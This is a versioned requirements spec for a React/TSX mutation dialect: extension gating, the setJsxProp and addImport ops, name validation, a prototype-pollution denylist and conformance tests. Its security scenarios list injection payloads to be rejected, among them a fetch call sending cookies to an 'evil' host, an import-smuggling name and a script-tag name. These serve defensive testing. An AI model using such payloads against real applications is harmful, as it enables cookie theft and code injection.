# React (TSX/JSX) Dialect Specification

**Spec version**: V4
**Status**: signed (owner, 2026-07-16)
**Change**: `react-dialect`

(V4: owner-dictated micro-amendment #2, unfreeze micro-cycle 2026-07-16 — signed status
RETAINED, owner rulings applied verbatim. TWO changes. (1) REQ-RXD-02: V3's
extensionless-basename normalization is REVERTED — an extensionless basename now REJECTS.
Owner's forward-compatibility ruling: `.jsx` support is a registered pending-changes row; when
it lands, an extensionless path would be AMBIGUOUS between `Button.tsx` and `Button.jsx`, and a
baked-in `.tsx` assumption would be a breaking surface change to unwind. Scenario IDs
REQ-RXD-02.6 and REQ-RXD-02.7 (minted V3 for the normalize + directory-dots-normalize cases)
are RETIRED at V4 — never consumed by any downstream artefact, never to be reused;
REQ-RXD-02.8 (dotfile/trailing-dot rejects) is KEPT — that behaviour is unchanged — with its
rationale wording updated to drop the normalization reference. New scenarios REQ-RXD-02.9/.10
pin the extensionless reject. REQ-RXD-09's V3 convenience docs criterion and scenario
REQ-RXD-09.5 are REPLACED in place with the explicit-extension requirement documentation.
(2) REQ-RXD-06: the reserved-name denylist widens from `{__proto__}` to `{__proto__,
constructor, prototype}` — the full prototype-walk set — for BOTH `elementName` and `propName`
(security council rec, owner-approved; verified no signed ACCEPT scenario needs
`constructor`/`prototype`). The denylist is a frozen `Set` checked via `.has()` equality —
never an object literal, never regex-encoded. REQ-RXD-06.5's hostile battery gains both names.
Nothing else moved; the local-consumption delta is untouched.)

(V3 — superseded by V4's change 1: owner-dictated extensionless-basename normalization
(`find("src/Button")` ≡ `find("src/Button.tsx")`, observable on directives; scenarios
REQ-RXD-02.6/.7/.8, docs criterion REQ-RXD-09.5). The V3 rationale — authors shouldn't pay
ceremony for the only supported extension — was reconsidered against `.jsx`
forward-compatibility and reversed.)

(V2: council synthesis incorporated — qa-engineer + security-engineer + business-analyst.
Headline changes: the single-regex validator is replaced by THREE per-argument grammars
(REQ-RXD-06, security-verified against ts-morph's own `.d.ts` — `JsxAttributeStructure.name`
and initializers are written as RAW TEXT, so the validator is load-bearing, not
belt-and-suspenders); the `value` trust boundary is promoted to a first-class requirement
(REQ-RXD-12); `setJsxProp` gains a deterministic match-count trio (REQ-RXD-04), a placement/
whitespace contract (REQ-RXD-10), and a value grammar (REQ-RXD-11); rejection-surface hygiene
(no-echo tails, zero-emit + byte-unchanged on every reject) is REQ-RXD-13; the spike-dependency
supply-chain gate is REQ-RXD-14; the extension gate's timing is pinned synchronous-at-`find()`
(REQ-RXD-02); the conformance corpus mix is re-specified with TSX-mode-engagement proof
(REQ-RXD-03/08). All V1 REQ-IDs preserved; new requirements are REQ-RXD-10..14.)

## Purpose

Schematic authors who need to mutate `.tsx`/JSX files have no dialect that supports that syntax
today — `ts.find("Component.tsx")` reaches the shipped TypeScript dialect's `.ts`-only parser
and throws. This capability ships a second dialect, `@pbuilder/sdk/react`, mirroring the proven
TypeScript dialect's shape (parse/print pair, `find()` entry, op-pack composition) with a
deliberately minimal v1 op pair — `setJsxProp` + `addImport` — that proves JSX-structural
mutation end to end without committing to a full React mutation catalog.

## Requirements

### REQ-RXD-01: Frozen subpath + exact 2-op vocabulary

The React dialect MUST be reachable at the exact subpath `@pbuilder/sdk/react`. Its op-pack
MUST expose `.modify(fn)` (universal escape hatch, `dialect-generics` REQ-DG-03) plus EXACTLY
TWO structured ops: `setJsxProp(elementName: string, propName: string, value?: string)` and
`addImport(name: string, from: string)`. No third op ships in v1 — the exact set is an
anti-smuggle assertion, not an allow-list a contributor can quietly extend.

(Previously: `setJsxProp`'s `value` was typed required `value: string`. V2 makes it optional —
an omitted `value` produces the boolean-shorthand attribute form, REQ-RXD-11.)

#### Scenario REQ-RXD-01.1: subpath resolves, exact op-set shape

- GIVEN `package.json#exports`
- WHEN `@pbuilder/sdk/react` is imported and `Object.keys(dialect.ops)` is sorted
- THEN it resolves AND the sorted array EQUALS EXACTLY `["addImport", "setJsxProp"]` —
  asserted via `toEqual`, never `toContain`/subset, so an extra op fails RED

### REQ-RXD-02: Extension gate — `.tsx`-only, synchronous at `find()`, fail-closed

`find(path)` MUST classify `path` SYNCHRONOUSLY, at the `find()` call itself — before any op is
chained, before any parse is attempted, before any run flush — by its BASENAME:

- **Basename with suffix `.tsx` → pass**.
- **Extensionless basename → reject (V4)**: when the basename of `path` contains no `.` at
  all, `find()` MUST reject via `dialectError` — the React dialect REQUIRES an explicit `.tsx`
  extension. The tail names the rule and the fix, e.g.: `find(path) — the React dialect
  requires an explicit .tsx extension; received a path with no extension. Append .tsx to the
  path.` RATIONALE (in-contract, not incidental): the extension must be explicit because
  future `.jsx` support (a registered pending-changes row) would make an ASSUMED extension
  ambiguous between `Button.tsx` and `Button.jsx` — an implicit `.tsx` default would then be a
  breaking surface change to unwind. Dots in DIRECTORY segments do not make an extension —
  `find("src/v1.2/Button")` has an extensionless basename and rejects the same way.
- **Basename with a dot, suffix not `.tsx` → reject** via `dialectError`, V2 behaviour
  unchanged. The rejection message MUST name the fix: for `.ts`, it MUST point the author at
  `@pbuilder/sdk/typescript`; for `.jsx`, it MUST state v1 does not support `.jsx` and
  reference the React op-catalog follow-up; for any other suffix, it MUST state `.tsx` is the
  only supported extension. Deterministic edges resolve by the same suffix rule: a dotfile
  (`find(".babelrc")`) has suffix `babelrc` → reject with the "only `.tsx`" tail; a
  trailing-dot basename (`find("Button.")`) has an EMPTY suffix → reject. Error tails are
  UNCHANGED from V2 for all pre-existing reject classes.

(Timing ruled, V2: the handle factory constructs synchronously and touches no run context until
an op enqueues, so the earliest deterministic gate point is the `find()` call; a
deferred-to-flush mutant dies against this pin. The extensionless reject carries the SAME
timing pin.) The message MAY echo the offending path (bounded — paths are not payloads;
contrast REQ-RXD-13's value no-echo rule). This gate is NEW behaviour relative to the
TypeScript dialect's `find()` (which performs no extension check today) — deliberately
introduced here since a wrong-extension file previously reached the parser and threw an
unhelpful raw error.

(Previously: V2 rejected every non-`.tsx` path, extensionless ones falling into the
"other extension" class without a dedicated rule or scenario. V3 briefly made an extensionless
basename NORMALIZE to `.tsx` (owner DX ruling); V4 REVERTS that to an explicit, dedicated
reject with the forward-compatibility rationale above — scenario IDs REQ-RXD-02.6/.7 (V3's
normalize + directory-dots-normalize) are retired, never consumed, never to be reused. V1→V2
history: V1 required the gate "BEFORE attempting to parse" but left WHEN unpinned; V2 pinned
synchronous-at-`find()` with a timing scenario and added the bounded-path-echo allowance.)

#### Scenario REQ-RXD-02.1: `.ts` path rejected, names the fix

- GIVEN a path ending in `.ts`
- WHEN `find(path)` is called
- THEN it throws a `dialectError` whose message names `@pbuilder/sdk/typescript` as the fix

#### Scenario REQ-RXD-02.2: `.jsx` path rejected, names the follow-up

- GIVEN a path ending in `.jsx`
- WHEN `find(path)` is called
- THEN it throws a `dialectError` stating `.jsx` is unsupported in v1 and naming the React
  op-catalog follow-up as where it is tracked

#### Scenario REQ-RXD-02.3: other extension rejected, generic message

- GIVEN a path ending in an extension that is neither `.tsx`, `.ts`, nor `.jsx` (e.g. `.md`)
- WHEN `find(path)` is called
- THEN it throws a `dialectError` stating `.tsx` is the only supported extension

#### Scenario REQ-RXD-02.4: `.tsx` path proceeds past the gate

- GIVEN a path ending in `.tsx`
- WHEN `find(path)` is called and an op runs
- THEN no extension-gate rejection occurs — the handle proceeds to parse

#### Scenario REQ-RXD-02.5: gate timing is synchronous — the `find()` call itself throws (NEW, V2)

- GIVEN a path ending in `.ts`
- WHEN `find(path)` is invoked bare, with NO op chained and NO run flush
- THEN the `find()` call itself throws synchronously (`expect(() => find("a.ts")).toThrow`) —
  a gate deferred to first-op resolution or to flush FAILS this scenario

(Scenario IDs REQ-RXD-02.6 and REQ-RXD-02.7 — minted at V3 for the extensionless-normalize and
directory-dots-normalize cases — are RETIRED at V4: never consumed by any downstream artefact,
never to be reused for different behaviour.)

#### Scenario REQ-RXD-02.8: dotfile and trailing-dot basenames reject via the suffix rule (V3; wording updated V4)

- GIVEN `find(".babelrc")` and `find("Button.")`
- WHEN each is called
- THEN each throws a `dialectError` synchronously with the existing "only `.tsx`" reject tail —
  `.babelrc`'s suffix is `babelrc`, `Button.`'s suffix is empty; both basenames CONTAIN a dot,
  so both resolve through the non-`.tsx`-suffix rule, not the extensionless rule

#### Scenario REQ-RXD-02.9: extensionless basename rejects, tail names the explicit-`.tsx` requirement (NEW, V4)

- GIVEN `find("src/Button")` — a basename containing no `.`
- WHEN `find()` is called
- THEN it throws a `dialectError` synchronously whose tail states the React dialect requires an
  explicit `.tsx` extension and tells the author to append `.tsx` — no normalization, no
  deferred rejection

#### Scenario REQ-RXD-02.10: directory dots don't make an extension — same reject (NEW, V4)

- GIVEN `find("src/v1.2/Button")` — a dotted DIRECTORY segment, extensionless basename
- WHEN `find()` is called
- THEN it throws the SAME explicit-`.tsx`-requirement `dialectError` as REQ-RXD-02.9 — the
  `v1.2` directory dot does not count as an extension

### REQ-RXD-03: ts-morph `ScriptKind.Tsx` parse/print fidelity — mode engagement proven

The React dialect's `ast.parse`/`ast.print` pair MUST use ts-morph with a virtual `.tsx` path
(`ScriptKind.Tsx`), reusing the byte-exact `getFullText()` mechanism, BOM re-prepend, and
content-derived `detectNewLineKind` the TypeScript dialect's `ast.ts` already proves
(owner-ratified AST library decision) — never a host-OS-derived setting, never a different AST
library. Round-trip fidelity (`print(parse(source)) === source`) MUST be byte-exact for both
plain-TSX and JSX-bearing content, including BOM and CRLF preservation. TSX MODE ENGAGEMENT
MUST be proven by parse-divergence, not assumed: source that parses DIFFERENTLY under
`ScriptKind.Tsx` than under plain `.ts` semantics is the only evidence the flag is live.

(Previously: V1 asserted round-trip fidelity only. V2 adds the mode-engagement divergence proof
— council's highest-value coverage gap: nothing in V1 proved `ScriptKind.Tsx` was actually
engaged rather than silently falling back to `.ts` parsing.)

#### Scenario REQ-RXD-03.1: JSX round-trip byte-exact

- GIVEN a `.tsx` sample containing fragments, self-closing tags, and expression containers
- WHEN parsed and printed with no edit
- THEN the output is byte-exact against the original

#### Scenario REQ-RXD-03.2: BOM+JSX preserved

- GIVEN a seeded `.tsx` file with a UTF-8 BOM and JSX content
- WHEN round-tripped with no edit
- THEN the BOM is preserved byte-exact

#### Scenario REQ-RXD-03.3: CRLF+JSX preserved

- GIVEN a seeded `.tsx` file with CRLF line endings and JSX content
- WHEN round-tripped with no edit
- THEN CRLF line endings are preserved byte-exact

#### Scenario REQ-RXD-03.4: TSX-only generic-arrow syntax round-trips (NEW, V2)

- GIVEN the sample `const id = <T,>(a: T) => a;` — the trailing-comma generic arrow form TSX
  requires for disambiguation
- WHEN parsed and printed with no edit
- THEN it round-trips byte-exact — the parse succeeds under TSX semantics

#### Scenario REQ-RXD-03.5: angle-bracket cast REJECTS — divergence proves Tsx mode engaged (NEW, V2)

- GIVEN the sample `const x = <string>y;` — a legal angle-bracket CAST under `.ts` semantics,
  but an unclosed JSX element (syntax error) under `ScriptKind.Tsx`
- WHEN `parse` runs on it
- THEN it FAILS as a parse rejection (contained per `dialect-generics` REQ-DG-05.2's contract)
  — the SAME source parses cleanly through the TypeScript dialect's `parse`, and that
  divergence is the proof `ScriptKind.Tsx` is live, not silently defaulted

### REQ-RXD-04: `setJsxProp` — deterministic targeting + upsert

`setJsxProp(elementName, propName, value?)` MUST resolve its target by counting elements whose
opening (or self-closing) tag name matches `elementName` (a LOOKUP against the tag-name node's
text — see REQ-RXD-06 for the lookup-only property): ZERO matches → reject via `dialectError`
naming the missing element and suggesting `.modify()`; EXACTLY ONE match → mutate it; MORE THAN
ONE match → reject via `dialectError` naming the element AND the match COUNT and pointing at
`.modify()` for disambiguation. Never silent-first-match — targeting is deterministic or it is
a loud reject. On the single match: update `propName`'s value if the attribute already exists
on its attribute list (upsert), or INSERT a new attribute if absent — never an
append-duplicate. The op MUST leave every other region of the file byte-stable (single-op
fidelity, mirrors `dialect-conformance` REQ-DC-02).

(Previously: V1 said "the FIRST JsxOpeningElement matching" — silent-first-match. V2 replaces
that with the reject-on-ambiguous match-count trio per 3-lens council convergence; orchestrator
flags this ruling to the owner at sign time.)

#### Scenario REQ-RXD-04.1: exactly one match — insert new prop

- GIVEN a `.tsx` file containing exactly ONE `<Button />` with no `onClick` attribute
- WHEN `setJsxProp("Button", "onClick", "{handleClick}")` is applied
- THEN the printed output shows the `onClick` attribute inserted, and every other region of
  the file is byte-identical to the original

#### Scenario REQ-RXD-04.2: update existing prop (upsert, no duplicate)

- GIVEN a `.tsx` file containing `<Button onClick={oldHandler} />`
- WHEN `setJsxProp("Button", "onClick", "{newHandler}")` is applied
- THEN the printed output replaces the attribute's value with `{newHandler}`, with no
  duplicate `onClick` attribute on the element

#### Scenario REQ-RXD-04.3: unchanged-elsewhere

- GIVEN a multi-element `.tsx` sample and `setJsxProp` applied to the ONE matching element
- WHEN the printed output is diffed against the original
- THEN only the targeted attribute's region differs; every other line is byte-identical

#### Scenario REQ-RXD-04.4: zero matches — loud reject naming the element (NEW, V2)

- GIVEN a `.tsx` file containing no element named `Missing`
- WHEN `setJsxProp("Missing", "x", "{1}")` is applied
- THEN it rejects via `dialectError` naming `Missing` as not found and suggesting `.modify()`,
  with zero directives emitted and the file byte-unchanged (REQ-RXD-13)

#### Scenario REQ-RXD-04.5: two matches — deterministic reject naming element and count (NEW, V2)

- GIVEN a `.tsx` file containing TWO `<Button />` elements
- WHEN `setJsxProp("Button", "onClick", "{f}")` is applied
- THEN it rejects via `dialectError` naming `Button` AND the count (2) and pointing at
  `.modify()` — never a silent mutation of the first match; zero directives, file byte-unchanged

#### Scenario REQ-RXD-04.6: member-expression element name targets `<Menu.Item />` (NEW, V2)

- GIVEN a `.tsx` file containing exactly one `<Menu.Item />`
- WHEN `setJsxProp("Menu.Item", "disabled")` is applied
- THEN the attribute is inserted on that element (boolean shorthand, REQ-RXD-11), byte-exact
  against a committed golden

### REQ-RXD-05: `addImport` — merge-or-create, idempotent, named-only

`addImport(name, from)` MUST merge `name` into an EXISTING named-import clause from the SAME
module `from` if one already exists on the file, or INSERT a fresh
`import { name } from "from";` declaration otherwise. Idempotent: calling `addImport` twice
with the same `name`+`from` on one handle MUST produce a single import line, never a duplicate.
The op is NAMED-BINDING-ONLY, pinned as contract: it always produces the named form
`import { name } from "..."` — default and namespace imports are NOT supported in v1 (a
documented limitation; the React op-catalog follow-up is their home, REQ-RXD-09).

(Previously: V1's requirement text cited `typescript-dialect` REQ-TSD-01.2/REQ-TSD-03.10 as the
normative source of the merge and idempotency rules. V2 makes this contract self-contained —
the rules are stated here in full; no cross-domain REQ-ID is load-bearing. V2 also adds the
named-only pin and its scenario.)

#### Scenario REQ-RXD-05.1: fresh import inserted

- GIVEN a `.tsx` file with no import from the target module
- WHEN `addImport("useState", "react")` is applied
- THEN the printed output contains `import { useState } from "react";` inserted, byte-exact
  against a committed golden fixture

#### Scenario REQ-RXD-05.2: merges into an existing clause

- GIVEN a `.tsx` file with an existing `import { useEffect } from "react";`
- WHEN `addImport("useState", "react")` is applied
- THEN the printed output merges to a single clause naming both `useEffect` and `useState`

#### Scenario REQ-RXD-05.3: duplicate call idempotent

- GIVEN `find(path).addImport(x, m).addImport(x, m)` — the SAME name+module called twice
- WHEN flushed
- THEN the printed content contains a SINGLE valid import statement for `{x} from m` — no
  duplicate import lines

#### Scenario REQ-RXD-05.4: named-only form pinned — no default-import synthesis (NEW, V2)

- GIVEN a `.tsx` file and `addImport("React", "react")`
- WHEN flushed
- THEN the printed output contains the NAMED form `import { React } from "react";` — NOT
  `import React from "react"` — pinning that v1 never synthesizes default/mixed imports

### REQ-RXD-06: Per-argument name validation at the op boundary (security — load-bearing)

Validation is PER-ARGUMENT with THREE distinct grammars — a single shared identifier regex is
wrong for JSX and is explicitly rejected by this requirement:

- **`addImport.name`** MUST match `^[A-Za-z_$][A-Za-z0-9_$]*$` (JS import bindings are plain
  identifiers). No alias handling — neither v1 op takes an `as`-alias argument. NOTE: the
  shipped TypeScript dialect's `addImport` performs NO name validation today (a confirmed
  vulnerability class); the React dialect's MUST, from day one.
- **`setJsxProp.propName`** MUST match `^[A-Za-z_][A-Za-z0-9_-]*(:[A-Za-z_][A-Za-z0-9_-]*)?$`
  — hyphens and ONE colon segment admitted, so `data-testid`, `aria-label`, and `xlink:href`
  (the most common real-world attribute classes) are accepted. The widening is injection-safe:
  neither `-` nor `:` can terminate the attribute-name token. ADDITIONALLY, the reserved-name
  DENYLIST `{__proto__, constructor, prototype}` — the full prototype-walk set (V4 widening;
  V2/V3 listed `__proto__` only) — MUST be rejected despite all three matching the grammar
  (prototype-pollution defence; Stage-4b shipped a real `__proto__` seed bug). The denylist is
  a frozen `Set` checked via `.has()` equality — NEVER an object literal (whose own inherited
  keys are exactly the attack), never regex-encoded.
- **`setJsxProp.elementName`** MUST match a member/namespaced/hyphenated JSX-name grammar
  (accepting `Button`, `Menu.Item`, `my-web-component`), and the SAME reserved-name denylist
  `{__proto__, constructor, prototype}` MUST be rejected (same rationale, same frozen-`Set`
  mechanism). `elementName` is LOOKUP-ONLY: it is compared against
  each element's tag-name text, NEVER spliced into source — its validation is input-hygiene UX,
  not an injection gate. The spec states this property explicitly so the trust analysis stays
  honest: `propName` is the spliced, validator-protected channel; `elementName` is not spliced
  at all.
- **`addImport.from`** has NO allow-list — legitimate module specifiers contain `@ / . :` and
  more. Safety rests on ts-morph string-literal-escaping the `moduleSpecifier` field; that
  assumption is PINNED by the regression scenario REQ-RXD-06.4, not assumed silently.

A failing value MUST reject via `dialectError` BEFORE the AST is touched, with zero directives
emitted and the target file byte-unchanged (REQ-RXD-13). The validator is LOAD-BEARING, not
belt-and-suspenders: ts-morph writes `JsxAttributeStructure.name` and attribute initializers as
RAW TEXT with no escaping (verified against ts-morph's `.d.ts` — `JsxAttributeStructure`'s
name/initializer fields and `setInitializer(text)`), so `propName` safety comes from this
validator ALONE.

(Previously: V1 mandated one shared pattern `^[A-Za-z_$][A-Za-z0-9_$]*$` for elementName,
propName, AND addImport.name, with both-sides-of-`as` alias checking, and implied `from` safety
came from ts-morph's "structured API". V2: three per-argument grammars; alias language dropped
(no v1 op takes an alias); the structured-API-safety implication corrected to a pinned escaping
assumption; `__proto__` denylist added; elementName's lookup-only property stated.)

#### Scenario REQ-RXD-06.1: hostile expression as PROP NAME rejected pre-mutation (SEC-1)

- GIVEN `setJsxProp("Button", 'onError={fetch("//evil/"+cookie)}', "{x}")` — an injection
  payload in the propName position
- WHEN applied
- THEN it rejects via `dialectError` BEFORE any AST mutation — zero directives emitted, target
  file byte-unchanged (contrast REQ-RXD-12.1: the same payload as VALUE is emitted by contract)

#### Scenario REQ-RXD-06.2: real-world widened attribute names ACCEPTED byte-exact (SEC-2)

- GIVEN `setJsxProp` applied with propNames `data-testid`, `aria-label`, and `xlink:href`
  (each on its own single-match element)
- WHEN flushed
- THEN all three succeed and the printed output is byte-exact against a committed golden —
  the widened grammar admits hyphens and one colon segment

#### Scenario REQ-RXD-06.3: `addImport` name breakout rejected, zero imports (SEC-3)

- GIVEN `addImport('x } from "evil"; import { y', "react")` — a name attempting to close the
  clause and smuggle a second import
- WHEN applied
- THEN it rejects via `dialectError`; the printed file contains ZERO new import statements and
  is byte-unchanged

#### Scenario REQ-RXD-06.4: `from` escaping regression pin — hostile specifier stays ONE string (SEC-4)

- GIVEN `addImport("X", 'a"; import {y} from "evil')` — a module specifier attempting to
  terminate its own string literal
- WHEN flushed
- THEN the printed output contains exactly ONE import declaration whose module specifier is the
  full hostile string, ESCAPED as a single string literal — no `"evil"` module import exists in
  the output (pins the ts-morph escaping assumption this REQ rests on)

#### Scenario REQ-RXD-06.5: hostile-name battery — all rejected pre-mutation (NEW V2; denylist widened V4)

- GIVEN each of `__proto__`, `constructor`, `prototype` (the full prototype-walk denylist, V4),
  `"Foo bar"`, `"Foo=1}"`, `"a><script>alert(1)</script>"`, `""` (empty), `"   "`
  (whitespace-only), `"foo\nbar"`, `"123abc"` supplied as `elementName` and as `propName` (and,
  where the grammar applies, as `addImport.name`)
- WHEN each op is applied
- THEN every case rejects via `dialectError` pre-mutation — zero directives, file
  byte-unchanged; the three denylist names reject via the frozen-`Set` equality check even
  though each matches the grammar, and each such tail names the reserved-name rule (the fixed
  denylist literal MAY be echoed — it equals the rule's own vocabulary, ≤16 chars)

#### Scenario REQ-RXD-06.6: elementName grammar accepts member and hyphenated names (NEW, V2)

- GIVEN `setJsxProp("Menu.Item", "x", "{1}")` and `setJsxProp("my-web-component", "x", "{1}")`
  each against a `.tsx` file containing exactly one matching element
- WHEN applied
- THEN neither is rejected by the name validator — both proceed to targeting (REQ-RXD-04)

### REQ-RXD-07: Coalescing — heterogeneous-region proof

A chain `find(path).setJsxProp(...).addImport(...)` (or the reverse order) on ONE handle MUST
coalesce into EXACTLY ONE `modify` directive whose content reflects BOTH mutations — the
import-declaration region AND the JSX-attribute region — proving the ADR-0006/ADR-0037
one-live-AST seam across heterogeneous AST regions, a strictly stronger proof than two ops
mutating the same subtree.

#### Scenario REQ-RXD-07.1: two heterogeneous ops, one modify

- GIVEN `find(path).setJsxProp("Button", "onClick", "{handleClick}").addImport("handleClick",
  "./handlers")` — mutating a JSX attribute AND an import declaration on one handle
- WHEN flushed
- THEN exactly ONE `modify` directive is emitted, AND its content shows BOTH the imported
  symbol AND the JSX attribute wired in, byte-exact against a committed golden fixture

### REQ-RXD-08: Conformance — byte-exact gate over the JSX adversarial corpus (required capability)

`testDialect`/`testOpPack` MUST run green against the six kit-mandatory adversarial samples
PLUS a ~20-sample JSX-specific adversarial corpus whose MIX (not merely count) covers, at
minimum: fragments; self-closing tags; spread props; namespaced attributes; entities;
comments-inside-JSX as an explicit `{/* x */}` sample; conditional and ternary rendering
(`{cond && <X/>}`, `{cond ? <A/> : <B/>}`); parenthesised JSX return
(`return (\n  <div/>\n)`); JSX-lookalike strings that must NOT be JSX-ified (a template
literal containing `<div>${x}</div>`; `<p>{"<script>"}</p>`); whitespace fidelity (`<br />`
vs `<br/>` — the pre-`/>` space survives); TSX-distinctive parse forms (`const id = <T,>(a: T)
=> a;`); `<Menu.Item/>`; a multi-line-attribute element; CRLF+JSX; BOM+JSX; and a 4 MiB TSX
sample. This corpus is a REQUIRED capability of this change, not an optional nice-to-have —
the kit's own 6 mandatory samples are JSX-blind and do not exercise this dialect's actual
syntax surface.

(Previously: V1 enumerated a smaller mix. V2 re-specifies the corpus mix per council — mix
beats count; the TSX-distinctive and JSX-lookalike classes are the highest-value additions.)

#### Scenario REQ-RXD-08.1: corpus green through `testDialect`

- GIVEN the JSX adversarial corpus (every class enumerated above) plus the 6 kit-mandatory
  samples
- WHEN run through `testDialect` against the React dialect
- THEN every sample round-trips byte-exact

#### Scenario REQ-RXD-08.2: `setJsxProp` op-pack fidelity proven under real mutation

- GIVEN the JSX adversarial corpus exercised via `testOpPack` with `setJsxProp` chains,
  including the `<Menu.Item/>` sample and the multi-line-attribute element as INSERTION targets
- WHEN run
- THEN each exercise's coalesced `modify` content is byte-exact against its fixture `expect`
  value — proving `setJsxProp`'s `JsxAttribute` set/add fidelity across the corpus under a
  REAL mutation, not merely idle round-trip (spike-gate obligation: Open Flags for Design)

### REQ-RXD-09: Author-facing docs — second worked example, trust posture, honest limitations

`docs/authoring-a-dialect.md` MUST gain a second worked example for `@pbuilder/sdk/react`
meeting ALL of these criteria:

- the worked example is the COALESCED author journey — `addImport` + `setJsxProp` on one
  handle — with the byte output shown via `// ->` comments (matching the doc's existing
  worked-example convention), not an isolated single-op snippet;
- author-facing prose states the v1 2-op minimality, NAMES the React op-catalog follow-up plan
  as where additional ops land, and shows `.modify(fn)` as the interim escape hatch;
- the `value` trust boundary (REQ-RXD-12's wording) appears in the doc — authors are told
  `value` becomes executable code and untrusted input is their responsibility to sanitise;
- the named-only `addImport` limitation (REQ-RXD-05) is documented, with default/mixed imports
  named as catalog-follow-up scope;
- the spread-precedence behaviour (REQ-RXD-10.2 — an inserted explicit prop lands AFTER a
  trailing `{...spread}` and therefore wins at React runtime) carries an explicit doc warning;
- per-op JSDoc on the shipped `setJsxProp`/`addImport` documents each op's idempotency and
  rejection rule at the same fidelity the TypeScript dialect's `addImport`/`removeImport`
  JSDoc already sets;
- the doc's now-stale "the first real dialect … five structured ops" framing is RECONCILED —
  the doc must not describe the TypeScript dialect as the only dialect once `./react` ships;
- (V4) the explicit-extension requirement (REQ-RXD-02 — always pass the `.tsx` extension;
  extensionless paths are rejected) is documented author-facing: in `find`'s JSDoc AND as a
  worked-example note, INCLUDING the why — extensionless paths are rejected to stay
  forward-compatible with future `.jsx` support.

(Previously: V1 required minimality + catalog + `.modify()` framing only. V2 adds the trust
boundary, named-only limitation, spread warning, `// ->` worked-example form, JSDoc-fidelity
criterion, and the stale-framing reconciliation. V3 briefly added an extensionless-convenience
documentation criterion; V4 replaces it in place with the explicit-extension requirement
documentation, tracking REQ-RXD-02's V4 reversal.)

#### Scenario REQ-RXD-09.1: doc names the shipped ops, minimality, catalog, and escape hatch

- GIVEN `docs/authoring-a-dialect.md` after this change
- WHEN scanned
- THEN it documents `@pbuilder/sdk/react`'s exactly two ops, states the v1 minimality, names
  the React op-catalog follow-up, and shows `.modify(fn)` as the escape hatch

#### Scenario REQ-RXD-09.2: worked example is the coalesced journey with `// ->` output

- GIVEN the doc's React worked example
- WHEN read
- THEN it chains `addImport` + `setJsxProp` on ONE handle and shows the resulting byte output
  via `// ->` comments

#### Scenario REQ-RXD-09.3: trust-boundary and spread warnings present, guard-asserted

- GIVEN the doc's `setJsxProp` coverage
- WHEN a guard test scans it (mirrors the REQ-DAS-01.2 two-realms guard pattern)
- THEN a `value`-trust section is present (untrusted input = author's responsibility) AND the
  spread-precedence warning is present — the guard fails RED if either section is removed

#### Scenario REQ-RXD-09.4: stale single-dialect framing reconciled (NEW, V2)

- GIVEN the doc after this change
- WHEN scanned for the pre-existing "first real dialect … five structured ops" framing
- THEN that framing is updated to acknowledge two dialects — no sentence describes
  `./typescript` as the only shipped dialect

#### Scenario REQ-RXD-09.5: explicit-extension requirement documented in find JSDoc and worked example (minted V3; content replaced V4)

- GIVEN the shipped `find`'s JSDoc and the doc's React worked-example section
- WHEN scanned
- THEN both state the explicit-`.tsx`-extension requirement — extensionless paths are rejected
  (REQ-RXD-02) — and name the forward-compatibility reason (future `.jsx` support), so authors
  learn the rule and the why without reading the spec

### REQ-RXD-10: `setJsxProp` placement and whitespace contract (NEW, V2)

An INSERTED attribute MUST be appended AFTER the last existing attribute (including after a
`{...spread}` when the spread is last), separated by a single space, with NO reflow of the
element or the rest of the file. Insertion after a trailing spread is deliberate semantics, not
an accident: the explicit prop landing after the spread means it WINS at React runtime
(later-position precedence) — the deterministic, author-favouring outcome. An UPDATED attribute
MUST have its initializer replaced IN PLACE — attribute position within the element preserved.
The element's closing form MUST be preserved: a self-closing element stays self-closing, a
paired-tag element stays paired. All placement scenarios are pinned by byte-exact goldens.

#### Scenario REQ-RXD-10.1: append-after-last, single space, no reflow

- GIVEN `<Button type="submit" className={cls} />` (one match)
- WHEN `setJsxProp("Button", "disabled", "{isBusy}")` is applied
- THEN the new attribute appears immediately after `className={cls}` with a single-space
  separator, byte-exact against a committed golden — no attribute reordering, no reflow

#### Scenario REQ-RXD-10.2: insertion after a trailing spread — explicit prop wins (SEC-5)

- GIVEN `<Button {...rest} />` (one match)
- WHEN `setJsxProp("Button", "onClick", "{safe}")` is applied
- THEN the printed output is `<Button {...rest} onClick={safe} />` byte-exact — the explicit
  prop lands AFTER the spread and therefore takes precedence at React runtime (the REQ's stated
  rationale; the paired doc warning is REQ-RXD-09.3)

#### Scenario REQ-RXD-10.3: update replaces initializer in place

- GIVEN `<Button onClick={old} type="submit" />`
- WHEN `setJsxProp("Button", "onClick", "{fresh}")` is applied
- THEN `onClick` stays the FIRST attribute with its initializer replaced — position preserved,
  byte-exact golden

#### Scenario REQ-RXD-10.4: self-closing form preserved

- GIVEN a self-closing `<Input />` (one match)
- WHEN `setJsxProp("Input", "required")` is applied
- THEN the element remains self-closing in the printed output

#### Scenario REQ-RXD-10.5: paired-tag form preserved

- GIVEN a paired `<Button>Save</Button>` (one match)
- WHEN `setJsxProp("Button", "disabled")` is applied
- THEN the element remains paired with its children byte-identical

#### Scenario REQ-RXD-10.6: multi-line-attribute element insertion

- GIVEN an element whose existing attributes span multiple lines
- WHEN `setJsxProp` inserts a new attribute
- THEN the printed output is byte-exact against a committed golden — existing line structure
  undisturbed

### REQ-RXD-11: `setJsxProp` value grammar — verbatim initializer text, three forms (NEW, V2)

`value` is the VERBATIM initializer text — the author supplies the delimiters: a `value` of
`'"hi"'` produces `bar="hi"` (string form); `'{count}'` produces `bar={count}` (expression
container); an OMITTED/`undefined` `value` produces the boolean-shorthand attribute
(`disabled`, no `=`). The op does NOT re-validate the output: a malformed `value` (e.g. `'{'`)
is emitted as-is per the trust contract (REQ-RXD-12) — the author owns output well-formedness
for this argument.

#### Scenario REQ-RXD-11.1: string form

- GIVEN `setJsxProp("Input", "placeholder", '"Search…"')` (one match)
- WHEN flushed
- THEN the printed attribute is `placeholder="Search…"`, byte-exact golden

#### Scenario REQ-RXD-11.2: expression-container form

- GIVEN `setJsxProp("Input", "value", "{count}")`
- WHEN flushed
- THEN the printed attribute is `value={count}`, byte-exact golden

#### Scenario REQ-RXD-11.3: omitted value — boolean shorthand

- GIVEN `setJsxProp("Input", "required")` with no third argument
- WHEN flushed
- THEN the printed attribute is bare `required` — no `=`, no initializer

#### Scenario REQ-RXD-11.4: upsert across form change

- GIVEN `<Input value="static" />` and `setJsxProp("Input", "value", "{dynamic}")`
- WHEN flushed
- THEN the attribute reads `value={dynamic}` — string form replaced by expression container in
  place, byte-exact golden

#### Scenario REQ-RXD-11.5: malformed value emitted as-is (trust contract)

